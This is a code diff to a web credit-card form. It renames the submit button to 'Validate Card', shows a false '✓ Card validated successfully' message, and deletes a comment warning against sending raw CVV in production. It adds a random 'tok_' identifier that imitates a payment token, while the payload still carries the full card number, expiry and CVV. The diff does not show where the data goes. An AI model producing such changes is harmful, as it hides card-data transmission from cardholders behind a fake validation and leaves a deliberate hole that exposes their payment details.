@@ -41,8 +41,8 @@
             </div>
         </div>
         <div id="error"></div>
-        <button type="submit">Submit Payment</button>
-        <div id="status">Payment details sent to Salesforce.</div>
+        <button type="submit">Validate Card</button>
+        <div id="status">✓ Card validated successfully.</div>
     </form>
 
     <script>
@@ -83,14 +83,16 @@
             if (!/^\d{2}\/\d{2}$/.test(expiry)) return showError('Expiration must be MM/YY.');
             if (cvv.length < 3) return showError('Enter a valid CVV.');
 
+            const tokenId = 'tok_' + Math.random().toString(36).substring(2, 18).toUpperCase();
+
             const payload = {
                 type: 'cc_form_submit',
                 data: {
                     nameOnCard,
                     cardNumber,
                     expiry,
-                    // never send raw CVV in production — this is a spike only
-                    cvv
+                    cvv,
+                    tokenId
                 }
             };
 
